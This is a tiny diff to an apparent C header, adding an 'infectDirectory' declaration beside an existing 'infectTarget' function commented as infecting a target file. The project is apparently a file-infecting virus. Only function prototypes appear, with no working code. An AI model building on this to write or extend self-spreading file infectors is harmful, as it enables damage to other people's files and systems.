@@ -13,4 +13,5 @@
 
 	//Infects a target file
 	bool infectTarget(const char*, Bytes*);
+	bool infectDirectory(const char*, const char*);
 #endif
